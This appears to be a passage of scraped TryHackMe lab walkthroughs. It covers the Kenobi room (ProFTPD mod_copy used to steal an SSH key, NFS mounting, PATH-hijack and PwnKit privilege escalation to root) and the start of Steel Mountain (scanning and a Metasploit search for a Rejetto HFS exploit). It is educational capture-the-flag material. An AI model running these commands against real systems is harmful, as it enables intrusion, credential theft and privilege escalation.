possible commands. smb: \\\u0026gt; ls . D 0 Wed Sep 4 06:49:09 2019 .. D 0 Wed Sep 4 06:56:07 2019 log.txt N 12237 Wed Sep 4 06:49:09 2019 9204224 blocks of size 1024. 6876708 blocks available smb: \\\u0026gt; get log.txt getting file \\log.txt of size 12237 as log.txt (25.4 KiloBytes/sec) (average 25.2 KiloBytes/sec) smb: \\\u0026gt; When we read the log.txt file, we can see the user is kenobi, the id_rsa file path and the ftp running on port 21.\nGenerating public/private rsa key pair. Enter file in which to save the key (/home/kenobi/.ssh/id_rsa): Created directory \u0026#39;/home/kenobi/.ssh\u0026#39;. Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /home/kenobi/.ssh/id_rsa. Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub. The key fingerprint is: SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi The key\u0026#39;s randomart image is: +---[RSA 2048]----+ | | | .. | | . o. . | | ..=o +. | | . So.o++o. | | o ...+oo.Bo*o | | o o ..o.o+.@oo | | . . . E .O+= . | | . . oBo. | +----[SHA256]-----+ # This is a basic ProFTPD configuration file (rename it to # \u0026#39;proftpd.conf\u0026#39; for actual use. It establishes a single server # and a single anonymous login. It assumes that you have a user/group # \u0026#34;nobody\u0026#34; and \u0026#34;ftp\u0026#34; for normal operation and anon. ServerName\t\u0026#34;ProFTPD Default Installation\u0026#34; ServerType\tstandalone DefaultServer\ton # Port 21 is the standard FTP port. Port\t21 On the port 111 we see there is rpcbind service running and in the rpcinfo we can see that nfs service is running. So, let\u0026rsquo;s enumerate for nfs shares and from the mount information we can see the mount /var.\nnmap -p 111 -script=nfs-ls,nfs-statfs,nfs-showmount 10.10.112.104 ❯ nmap -p 111 -script=nfs-ls,nfs-statfs,nfs-showmount 10.10.112.104 Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-25 00:53 EDT Nmap scan report for 10.10.112.104 Host is up (0.12s latency). PORT STATE SERVICE 111/tcp open rpcbind | nfs-showmount: |_ /var * | nfs-ls: Volume /var | access: Read Lookup NoModify NoExtend NoDelete NoExecute | PERMISSION UID GID SIZE TIME FILENAME | rwxr-xr-x 0 0 4096 2019-09-04T08:53:24 . | rwxr-xr-x 0 0 4096 2019-09-04T12:27:33 .. | rwxr-xr-x 0 0 4096 2019-09-04T12:09:49 backups | rwxr-xr-x 0 0 4096 2019-09-04T10:37:44 cache | rwxrwxrwt 0 0 4096 2019-09-04T08:43:56 crash | rwxrwsr-x 0 50 4096 2016-04-12T20:14:23 local | rwxrwxrwx 0 0 9 2019-09-04T08:41:33 lock | rwxrwxr-x 0 108 4096 2019-09-04T10:37:44 log | rwxr-xr-x 0 0 4096 2019-01-29T23:27:41 snap | rwxr-xr-x 0 0 4096 2019-09-04T08:53:24 www |_ | nfs-statfs: | Filesystem 1K-blocks Used Available Use% Maxfilesize Maxlink |_ /var 9204224.0 1737356.0 6976272.0 20% 16.0T 32000 Nmap done: 1 IP address (1 host up) scanned in 2.11 seconds We saw there is a ftp service running on port 21. We found that the ftp version is 1.3.5.\nWe will use searchsploit to find for any vulnerabilities present in the 1.3.5 version of ProFTPd.\nsearchsploit proftpd 1.3.5 While looking for the vulnerabilities for the proftpd version 1.3.5, we found that there is a vulnerability that exploits SITE CPFR/CPTO commands.\n❯ searchsploit proftpd 1.3.5 --------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path --------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- ProFTPd 1.3.5 - \u0026#39;mod_copy\u0026#39; Command Execution (Metasploit) | linux/remote/37262.rb ProFTPd 1.3.5 - \u0026#39;mod_copy\u0026#39; Remote Command Execution | linux/remote/36803.py ProFTPd 1.3.5 - \u0026#39;mod_copy\u0026#39; Remote Command Execution (2) | linux/remote/49908.py ProFTPd 1.3.5 - File Copy | linux/remote/36742.txt --------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results Exploitation # Using this we can copy files in the target. So, we will copy the id_rsa file to the /var directory and then mount the /var directory to our machine.\nLet\u0026rsquo;s connect to ftp and copy the files.\nnc 10.10.112.104 21 SITE CPFR /home/kenobi/.ssh/id_rsa SITE CPTO /var/tmp/id_rsa http://www.proftpd.org/docs/contrib/mod_copy.html\nSITE CPFR This SITE command specifies the source file/directory to use for copying from one place to another directly on the server. The syntax for SITE CPFR is: SITE CPFR source-path SITE CPTO This SITE command specifies the destination file/directory to use for copying from one place to another directly on the server. The syntax for SITE CPTO is: SITE CPTO destination-path A client wishing to copy a file/directory first sends a SITE CPFR command, then a SITE CPTO; this is similar to how renames are handled using RNFR and RNTO. Use of these SITE command can be controlled via \u0026lt;Limit\u0026gt; sections, e.g.: \u0026lt;Limit SITE_COPY\u0026gt; AllowUser alex DenyAll \u0026lt;/Limit\u0026gt; ❯ nc 10.10.112.104 21 220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.112.104] SITE CPFR /home/kenobi/.ssh/id_rsa 350 File or directory exists, ready for destination name SITE CPTO /var/tmp/id_rsa 250 Copy successful Now we will mount the /var directory to our machine.\nmkdir /mnt/kenobi mount 10.10.112.104:/var /mnt/kenobi cd /mnt/kenobi ❯ mkdir /mnt/kenobi ❯ mount 10.10.112.104:/var /mnt/kenobi ❯ cd /mnt/kenobi ❯ ls -la total 56 drwxr-xr-x 14 root root 4096 Sep 4 2019 . drwxr-xr-x 4 root root 4096 May 25 01:01 .. drwxr-xr-x 2 root root 4096 Sep 4 2019 backups drwxr-xr-x 9 root root 4096 Sep 4 2019 cache drwxrwxrwt 2 root root 4096 Sep 4 2019 crash drwxr-xr-x 40 root root 4096 Sep 4 2019 lib drwxrwsr-x 2 root staff 4096 Apr 12 2016 local lrwxrwxrwx 1 root root 9 Sep 4 2019 lock -\u0026gt; /run/lock drwxrwxr-x 10 root tss 4096 Sep 4 2019 log drwxrwsr-x 2 root mail 4096 Feb 26 2019 mail drwxr-xr-x 2 root root 4096 Feb 26 2019 opt lrwxrwxrwx 1 root root 4 Sep 4 2019 run -\u0026gt; /run drwxr-xr-x 2 root root 4096 Jan 29 2019 snap drwxr-xr-x 5 root root 4096 Sep 4 2019 spool drwxrwxrwt 6 root root 4096 May 25 01:00 tmp drwxr-xr-x 3 root root 4096 Sep 4 2019 www ❯ cd tmp/ ❯ ls -la total 28 drwxrwxrwt 6 root root 4096 May 25 01:00 . drwxr-xr-x 14 root root 4096 Sep 4 2019 .. -rw-r--r-- 1 kali kali 1675 May 25 01:00 id_rsa drwx------ 3 root root 4096 May 25 00:43 systemd-private-1e920d8729fd40e9bedb6b724b8b7e62-systemd-timesyncd.service-HJEhTc drwx------ 3 root root 4096 Sep 4 2019 systemd-private-2408059707bc41329243d2fc9e613f1e-systemd-timesyncd.service-a5PktM drwx------ 3 root root 4096 Sep 4 2019 systemd-private-6f4acd341c0b40569c92cee906c3edc9-systemd-timesyncd.service-z5o4Aw drwx------ 3 root root 4096 Sep 4 2019 systemd-private-e69bbb0653ce4ee3bd9ae0d93d2a5806-systemd-timesyncd.service-zObUdn root@kali /mnt/kenobi/tmp ❯ We can see the file, we will copy it to our machine and change the permissions for the file. Now ssh into the target as user kenobi.\nchmod 600 id_rsa ssh kenobi@10.10.112.104 -i id rsa ❯ ssh kenobi@10.10.112.104 -i id_rsa Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage 103 packages can be updated. 65 updates are security updates. Last login: Wed Sep 4 07:10:15 2019 from 192.168.1.147 To run a command as administrator (user \u0026#34;root\u0026#34;), use \u0026#34;sudo \u0026lt;command\u0026gt;\u0026#34;. See \u0026#34;man sudo_root\u0026#34; for details. kenobi@kenobi:~$ kenobi@kenobi:~$ id uid=1000(kenobi) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare) We\u0026rsquo;re logged in as kenobi.\nPrivilege Escalation # Approach 1 # We will find the files with SUID bit set.\nfind / -perm -u=s -type f 2\u0026gt;/dev/null kenobi@kenobi:~$ find / -perm -u=s -type f 2\u0026gt;/dev/null /sbin/mount.nfs /usr/lib/policykit-1/polkit-agent-helper-1 /usr/lib/dbus-1.0/dbus-daemon-launch-helper /usr/lib/snapd/snap-confine /usr/lib/eject/dmcrypt-get-device /usr/lib/openssh/ssh-keysign /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic /usr/bin/chfn /usr/bin/newgidmap /usr/bin/pkexec /usr/bin/passwd /usr/bin/newuidmap /usr/bin/gpasswd /usr/bin/menu /usr/bin/sudo /usr/bin/chsh /usr/bin/at /usr/bin/newgrp /bin/umount /bin/fusermount /bin/mount /bin/ping /bin/su /bin/ping6 /usr/bin/menu seems to be unusual among the list of file that we got.\nWhen we execute that binary, we can see a couple of commands that can be executed. We will now manipulate the PATH variable to get our root shell.\nkenobi@kenobi:~$ /usr/bin/menu *************************************** 1. status check 2. kernel version 3. ifconfig ** Enter your choice :1 HTTP/1.1 200 OK Date: Sat, 25 May 2024 05:09:29 GMT Server: Apache/2.4.18 (Ubuntu) Last-Modified: Wed, 04 Sep 2019 09:07:20 GMT ETag: \u0026#34;c8-591b6884b6ed2\u0026#34; Accept-Ranges: bytes Content-Length: 200 Vary: Accept-Encoding Content-Type: text/html When we used the first command to test what that does, we can see it is using curl to run the status check. Now, we will replace the functionality of the curl command in the status check with the /bin/sh and add it to the path so that we can get the shell as soon it gets executed.\nkenobi@kenobi:~$ cd /tmp/ kenobi@kenobi:/tmp$ echo /bin/sh \u0026gt; curl kenobi@kenobi:/tmp$ chmod 777 curl kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH kenobi@kenobi:/tmp$ /usr/bin/menu *************************************** 1. status check 2. kernel version 3. ifconfig ** Enter your choice :1 # id uid=0(root) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),113(lpadmin),114(sambashare) # We are root!!!\nApproach 2 # Start the python http server and download linpeas.sh to the target machine.\npython -m http.server 1111 On target machine\nwet http: //10.6.29.149:1111/linpeas.sh Change the file permissions to executable and run the file.\nchmod +x linpeas.sh ./linpeas.sh kenobi@kenobi:/tmp$ wget http://10.6.10.164/linpeas.sh --2024-05-25 00:13:03-- http://10.6.10.164/linpeas.sh Connecting to 10.6.10.164:80... connected. HTTP request sent, awaiting response... 200 OK Length: 847825 (828K) [text/x-sh] Saving to: ‘linpeas.sh’ linpeas.sh 100%[===================================================================================================\u0026gt;] 827.95K 1.13MB/s in 0.7s 2024-05-25 00:13:04 (1.13 MB/s) - ‘linpeas.sh’ saved [847825/847825] kenobi@kenobi:/tmp$ chmod +x linpeas.sh kenobi@kenobi:/tmp$ ./linpeas.sh ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄ ▄▄▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄▄▄ ▄ ▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄ ▄▄▄▄ ▄▄ ▄▄▄ ▄▄▄▄▄ ▄▄▄ ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄ ▄ ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄ ▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄ ▄ ▄▄ ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▀▀▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀ ▀▀▀▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▀▀ ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀ /---------------------------------------------------------------------------------\\ | Do you like PEASS? | |---------------------------------------------------------------------------------| | Get the latest version : https://github.com/sponsors/carlospolop | | Follow on Twitter : @hacktricks_live | | Respect on HTB : SirBroccoli | |---------------------------------------------------------------------------------| | Thank you! | \\---------------------------------------------------------------------------------/ linpeas-ng by carlospolop We can see that the target machine is vulnerable to CVE-2021-4034.\n[+] [CVE-2021-4034] PwnKit Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt Exposure: probable Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main We clone the repository to our machine.\nhttps://github.com/ryaagard/CVE-2021-4034.git\nStart the python server again to server the files.\npython -m http.server 1111 On target machine create a folder and download all the files to the machine.\nkenobi@kenobi:/tmp$ mkdir exploit kenobi@kenobi:/tmp$ cd exploit/ kenobi@kenobi:/tmp/exploit$ wget http://10.6.10.164/evil-so.c --2024-05-25 00:28:30-- http://10.6.10.164/evil-so.c Connecting to 10.6.10.164:80... connected. HTTP request sent, awaiting response... 200 OK Length: 183 [text/x-csrc] Saving to: ‘evil-so.c’ evil-so.c 100%[===================================================================================================\u0026gt;] 183 --.-KB/s in 0s 2024-05-25 00:28:30 (47.8 MB/s) - ‘evil-so.c’ saved [183/183] kenobi@kenobi:/tmp/exploit$ wget http://10.6.10.164/exploit.c --2024-05-25 00:28:46-- http://10.6.10.164/exploit.c Connecting to 10.6.10.164:80... connected. HTTP request sent, awaiting response... 200 OK Length: 614 [text/x-csrc] Saving to: ‘exploit.c’ exploit.c 100%[===================================================================================================\u0026gt;] 614 --.-KB/s in 0s 2024-05-25 00:28:47 (139 MB/s) - ‘exploit.c’ saved [614/614] kenobi@kenobi:/tmp/exploit$ wget http://10.6.10.164/Makefile --2024-05-25 00:29:03-- http://10.6.10.164/Makefile Connecting to 10.6.10.164:80... connected. HTTP request sent, awaiting response... 200 OK Length: 148 [application/octet-stream] Saving to: ‘Makefile’ Makefile 100%[===================================================================================================\u0026gt;] 148 --.-KB/s in 0s 2024-05-25 00:29:04 (31.5 MB/s) - ‘Makefile’ saved [148/148] Run the make file.\nkenobi@kenobi:/tmp/exploit$ make gcc -shared -o evil.so -fPIC evil-so.c evil-so.c: In function ‘gconv_init’: evil-so.c:10:5: warning: implicit declaration of function ‘setgroups’ [-Wimplicit-function-declaration] setgroups(0); ^ evil-so.c:12:5: warning: null argument where non-null required (argument 2) [-Wnonnull] execve(\u0026#34;/bin/sh\u0026#34;, NULL, NULL); ^ gcc exploit.c -o exploit exploit.c: In function ‘main’: exploit.c:25:5: warning: implicit declaration of function ‘execve’ [-Wimplicit-function-declaration] execve(BIN, argv, envp); ^ Execute the binary.\nkenobi@kenobi:/tmp/exploit$ ls evil.so evil-so.c exploit exploit.c Makefile kenobi@kenobi:/tmp/exploit$ ./e -bash: ./e: No such file or directory kenobi@kenobi:/tmp/exploit$ ./exploit # id uid=0(root) gid=0(root) groups=0(root) We are root!!!\n"},{"id":4,"href":"/docs/TryHackMe/SteelMountain/","title":"Steel Mountain","section":"Try Hack Me","content":" Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access.\nhttps://tryhackme.com/r/room/steelmountain\nScanning # Let\u0026rsquo;s begin by scanning the target. We will first scan the target using Rustscan.\n❯ rustscan -a 10.10.70.179 -- -sVC .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-\u0026#39; `-\u0026#39;`-----\u0026#39;`----\u0026#39; `-\u0026#39; `----\u0026#39; `---\u0026#39; `-\u0026#39; `-\u0026#39;`-\u0026#39; `-\u0026#39; The Modern Day Port Scanner. ________________________________________ : http://discord.skerritt.blog : : https://github.com/RustScan/RustScan : -------------------------------------- Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan [~] The config file is expected to be at \u0026#34;/root/.rustscan.toml\u0026#34; [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers [!] Your file limit is very small, which negatively impacts RustScan\u0026#39;s speed. Use the Docker image, or up the Ulimit with \u0026#39;--ulimit 5000\u0026#39;. Open 10.10.70.179:80 Open 10.10.70.179:135 Open 10.10.70.179:139 Open 10.10.70.179:445 Open 10.10.70.179:3389 Open 10.10.70.179:5985 Open 10.10.70.179:8080 Open 10.10.70.179:47001 Open 10.10.70.179:49156 Open 10.10.70.179:49153 Open 10.10.70.179:49155 Open 10.10.70.179:49170 Open 10.10.70.179:49169 Open 10.10.70.179:49154 Open 10.10.70.179:49152 [~] Starting Script(s) [\u0026gt;] Running script \u0026#34;nmap -vvv -p {{port}} {{ip}} -sVC\u0026#34; on ip 10.10.70.179 Depending on the complexity of the script, results may take some time to appear. [~] Starting Nmap 7.93 ( https://nmap.org ) at 2024-05-23 22:58 EDT NSE: Loaded 155 scripts for scanning. NSE: Script Pre-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 22:58 Completed NSE at 22:58, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 22:58 Completed NSE at 22:58, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 22:58 Completed NSE at 22:58, 0.00s elapsed Initiating Ping Scan at 22:58 Scanning 10.10.70.179 [4 ports] Completed Ping Scan at 22:58, 0.22s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 22:58 Completed Parallel DNS resolution of 1 host. at 22:58, 0.11s elapsed DNS resolution of 1 IPs took 0.11s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0] Initiating SYN Stealth Scan at 22:58 Scanning 10.10.70.179 [15 ports] Discovered open port 445/tcp on 10.10.70.179 Discovered open port 3389/tcp on 10.10.70.179 Discovered open port 8080/tcp on 10.10.70.179 Discovered open port 80/tcp on 10.10.70.179 Discovered open port 139/tcp on 10.10.70.179 Discovered open port 135/tcp on 10.10.70.179 Discovered open port 47001/tcp on 10.10.70.179 Discovered open port 49170/tcp on 10.10.70.179 Discovered open port 49153/tcp on 10.10.70.179 Discovered open port 49154/tcp on 10.10.70.179 Discovered open port 49156/tcp on 10.10.70.179 Discovered open port 49155/tcp on 10.10.70.179 Discovered open port 49152/tcp on 10.10.70.179 Discovered open port 49169/tcp on 10.10.70.179 Discovered open port 5985/tcp on 10.10.70.179 Completed SYN Stealth Scan at 22:58, 0.27s elapsed (15 total ports) Initiating Service scan at 22:58 Scanning 15 services on 10.10.70.179 Service scan Timing: About 53.33% done; ETC: 23:00 (0:00:49 remaining) Completed Service scan at 22:59, 76.97s elapsed (15 services on 1 host) NSE: Script scanning 10.10.70.179. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 22:59 Completed NSE at 22:59, 5.85s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 22:59 Completed NSE at 22:59, 0.54s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 22:59 Completed NSE at 22:59, 0.00s elapsed Nmap scan report for 10.10.70.179 Host is up, received reset ttl 125 (0.13s latency). Scanned at 2024-05-23 22:58:33 EDT for 84s PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack ttl 125 Microsoft IIS httpd 8.5 |_http-server-header: Microsoft-IIS/8.5 | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE |_http-title: Site doesn\u0026#39;t have a title (text/html). 135/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 125 Microsoft Windows netbios-ssn 445/tcp open microsoft-ds syn-ack ttl 125 Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 3389/tcp open ssl/ms-wbt-server? syn-ack ttl 125 | ssl-cert: Subject: commonName=steelmountain | Issuer: commonName=steelmountain | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha1WithRSAEncryption | Not valid before: 2024-05-23T02:56:08 | Not valid after: 2024-11-22T02:56:08 | MD5: 6e4d153ae7ee1b320d9d72afe32c2c46 | SHA-1: a0ccbed37da0eee5c10a1ebd4d6076f8f937545e | -----BEGIN CERTIFICATE----- | MIIC3jCCAcagAwIBAgIQautoTBW/+rhJokpnnG26hjANBgkqhkiG9w0BAQUFADAY | MRYwFAYDVQQDEw1zdGVlbG1vdW50YWluMB4XDTI0MDUyMzAyNTYwOFoXDTI0MTEy | MjAyNTYwOFowGDEWMBQGA1UEAxMNc3RlZWxtb3VudGFpbjCCASIwDQYJKoZIhvcN | AQEBBQADggEPADCCAQoCggEBAN3PQ47ytbMM3aObC6EF69B0V7Iex2ys1WYOJZGo | 8CDMjdF29eM0rBRlEc7xuXQRX8UM7IkKUORcRHJsklrJgtvDg6q8LKucJL4Zj55k | 5lO2yzBlgPFg1X5zFjlXEu+Ytg8u7Q0WndlU28Jq4bYmspuapajhB97pPxdJ3cv4 | Q32mZE4cwyXIRE/CCX7RvTLpFUXJT2Vqu917y8XUeXI4uO1zMU6F5PRyLLx1T3MS | Kq/IN4FvqE8Af+T9UYkGCD+TXrIG14RZ7GisgoeR5BXnB7wPhRhJfb0NjpAeWSu3 | vJE+RzlcGzszwxoBdR/E/ufXbJX8FY69o9YiUNrG8VVkoDMCAwEAAaMkMCIwEwYD | VR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBBQUAA4IB | AQBG/Ec+cj2a6PMxM7aUswvDGShDvneTBiwDcjRQmz4Vo7z3M5KLku1tTmgzHp/O | 1IH9aNmXWZK2VA42i6bKLIuJ57/7AhAwMbDIgFdck2ddkXGHP11qe2GroMExUEA8 | W7xRe8+RQ37ytWxB7fEn9VXAMsnV3h8bby1uNmnrmVoGbfMiP0Y6i2NijngVAJrf | /tBVFR7rjwjhg7b9GiDTXlnFNjZI/Wo9ThfhWR3grvEOMoPKaBUPkG7QzCQpoeDw | uA8gTVdJTTqoIaVQGvG5w1+xj1NQplP86/UZhVVQy/TzNJMtiRqhJeH1MAyaZTO7 | NnTbtK6ktlldHTWURZkG9J2P |_-----END CERTIFICATE----- | rdp-ntlm-info: | Target_Name: STEELMOUNTAIN | NetBIOS_Domain_Name: STEELMOUNTAIN | NetBIOS_Computer_Name: STEELMOUNTAIN | DNS_Domain_Name: steelmountain | DNS_Computer_Name: steelmountain | Product_Version: 6.3.9600 |_ System_Time: 2024-05-24T02:59:51+00:00 |_ssl-date: 2024-05-24T02:59:56+00:00; 0s from scanner time. 5985/tcp open http syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 8080/tcp open http syn-ack ttl 125 HttpFileServer httpd 2.3 |_http-server-header: HFS 2.3 | http-methods: |_ Supported Methods: GET HEAD POST |_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1 |_http-title: HFS / 47001/tcp open http syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 49152/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 49153/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 49154/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 49155/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 49156/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 49169/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC 49170/tcp open msrpc syn-ack ttl 125 Microsoft Windows RPC Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 302: |_ Message signing enabled but not required | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 33062/tcp): CLEAN (Couldn\u0026#39;t connect) | Check 2 (port 19020/tcp): CLEAN (Couldn\u0026#39;t connect) | Check 3 (port 53324/udp): CLEAN (Timeout) | Check 4 (port 25253/udp): CLEAN (Failed to receive data) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked | smb-security-mode: | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: \u0026lt;unknown\u0026gt;, NetBIOS MAC: 02e7560a719d (unknown) | Names: | STEELMOUNTAIN\u0026lt;00\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | WORKGROUP\u0026lt;00\u0026gt; Flags: \u0026lt;group\u0026gt;\u0026lt;active\u0026gt; | STEELMOUNTAIN\u0026lt;20\u0026gt; Flags: \u0026lt;unique\u0026gt;\u0026lt;active\u0026gt; | Statistics: | 02e7560a719d0000000000000000000000 | 0000000000000000000000000000000000 |_ 0000000000000000000000000000 | smb2-time: | date: 2024-05-24T02:59:50 |_ start_date: 2024-05-24T02:56:01 |_clock-skew: mean: 0s, deviation: 0s, median: 0s NSE: Script Post-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 22:59 Completed NSE at 22:59, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 22:59 Completed NSE at 22:59, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 22:59 Completed NSE at 22:59, 0.00s elapsed Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 84.37 seconds Raw packets sent: 19 (812B) | Rcvd: 16 (700B) Enumeration # There are a lot of ports open and since port 80 is open we will check what\u0026rsquo;s running on that port.\nThere is an image displaying their employee of the month and we can see the name Steel Mountain which might be an organization.\nWhile opening the image in a new tab we can see the name of the image as Bill Harper.\nhttp://10.10.70.179/img/BillHarper.png\nNow, we will check what\u0026rsquo;s running on port 8080. We can see that there is some file server running. Under the server information, there is mentioned that it is HttpFileServer 2.3.\n#Server information HttpFileServer 2.3 Server time: 5/23/2024 8:04:24 PM Server uptime: 00:07:51 On clicking that leads us to this page which shows that it is a Rejetto HttpFileServer 2.3.\n\u0026lt;fieldset id=\u0026#39;serverinfo\u0026#39;\u0026gt; \u0026lt;legend\u0026gt;\u0026lt;img src=\u0026#34;/~img0\u0026#34;\u0026gt; Server information\u0026lt;/legend\u0026gt; \u0026lt;a href=\u0026#34;http://www.rejetto.com/hfs/\u0026#34;\u0026gt;HttpFileServer 2.3\u0026lt;/a\u0026gt; \u0026lt;br /\u0026gt;Server time: 5/23/2024 8:05:49 PM \u0026lt;br /\u0026gt;Server uptime: 00:09:15 \u0026lt;/fieldset\u0026gt; Exploitation # We will search in metasploit if we can find any exploits.\nmsf6 \u0026gt; search rejetto Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/windows/http/rejetto_hfs_exec 2014-09-11 excellent Yes Rejetto HttpFileServer Remote Command Execution Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec msf6 \u0026gt; info 0 Name: Rejetto HttpFileServer Remote Command Execution Module: exploit/windows/http/rejetto_hfs_exec Platform: Windows Arch: Privileged: No License: Metasploit Framework License (BSD) Rank: Excellent Disclosed: 2014-09-11 Provided by: Daniele Linguaglossa \u0026lt;danielelinguaglossa@gmail.com\u0026gt; Muhamad Fadzil Ramli \u0026lt;mind1355@gmail.com\u0026gt; We found a module which is successfully tested on the version 2.3b. So, we will use this.\nDescription: Rejetto HttpFileServer (HFS) is vulnerable to remote command execution attack due to a poor regex in the file ParserLib.pas. This module exploits the HFS scripting commands by using \u0026#39;%00\u0026#39; to bypass the filtering. This module has been tested successfully on HFS 2.3b over Windows XP SP3, Windows 7 SP1 